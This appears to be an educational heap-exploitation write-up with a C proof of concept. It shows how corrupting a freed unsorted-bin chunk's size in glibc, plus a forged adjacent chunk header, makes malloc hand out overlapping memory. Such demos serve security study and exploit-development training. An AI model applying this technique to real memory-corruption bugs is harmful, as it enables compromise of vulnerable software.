<details>
<summary><strong>Description</strong></summary>
<p>

we will be trying to allocate partially overlapping chunks.

this time around, we will be doing so via expanding the size of an unsorted bin chunk, into an adjacent heap chunk we wish to allocate partially overlapping data into. Then, we will allocate that expanded chunk...

</p>
</details>

<details>
<summary><strong>POC</strong></summary>
<p>

> compiled with glibc `2.31`, `2.35`, `2.38` and `2.39`

```c
#include <stdio.h>
#include <stdlib.h>

void main() {
    setbuf(stdin, NULL); // disable buffering so _IO_FILE does not interfere with our heap
    setbuf(stdout, NULL);

    long *chunk0, *chunk1, *overlapping_chunk, *overlapping_chunk_end;

    chunk0 = malloc(0x420);
    chunk1 = malloc(0x80);

    free(chunk0);

    /*VULNERABILITY*/
    chunk0[-1] = 0x470 + 0x10; // expand the chunk0 (freed) size, overlapping with chunk1
    /*VULNERABILITY*/

    // this two fields need to fengshui depend on expanded size
    chunk1[8] = 0x470 + 0x10; // fake adjacent chunk prev_size
    chunk1[9] = 0x40; // fake adjacent chunk size

    overlapping_chunk = malloc(0x470); // allocate unsortedbin chunk via exact fit mechanism
    overlapping_chunk_end = (long *)((long)overlapping_chunk + 0x470 + 0x10);

    printf("overlapping chunk begin: %p\n", overlapping_chunk);
    printf("overlapping chunk end: %p\n", overlapping_chunk_end);
    printf("chunk 1: %p\n", chunk1);
}
```

</p>
</details>

<details>
<summary><strong>Explain</strong></summary>
<p>

so this process is going to be a bit simpler than previous techniques that produce more or less the same result.

**the first** thing we will have to do is free a chunk and have it inserted into the unsorted bin, that is adjacent to the chunk which we want to allocate again.

**the second** thing that we will need to do, is expand the size of the freed unsorted bin chunk, to expand it into the adjacent chunk, and contain the data which we want to overlap.

**the third** thing we will need to do is put a fake heap chunk header right after our expanded heap chunk, and put in heap metadata to match our expanded chunk. Also for this, I will put the size of the fake heap chunk to line up with the next actual heap chunk (help prevent potential issues).

**then** we will simply request from malloc, a chunk that is the exact size of the expanded unsorted bin chunk. It will get allocated, and just like that, we will have allocated the same block of memory twice.

in this context, we will start off with two chunks, one of size `0x430` and the other of size `0x90`. We will expand the `0x430` chunk `0x50` bytes. So we will set the size of the `0x430` chunk, to `0x480`. Then in the `0x90` chunk, `0x50` bytes after the actual heap chunk header, we will make a fake heap chunk header. We will set its `prev_size` to `0x480`, and the chunk size to `0x40`. Then, we will just allocate a chunk size of `0x480`, which will give us the overlapping chunk.

</p>
</details>

<details>
<summary><strong>Ref</strong></summary>
<p>

- https://github.com/guyinatuxedo/Shogun/blob/main/pwn_demos/unsorted_bin/exact_fit/readme.md

</p>
</details>
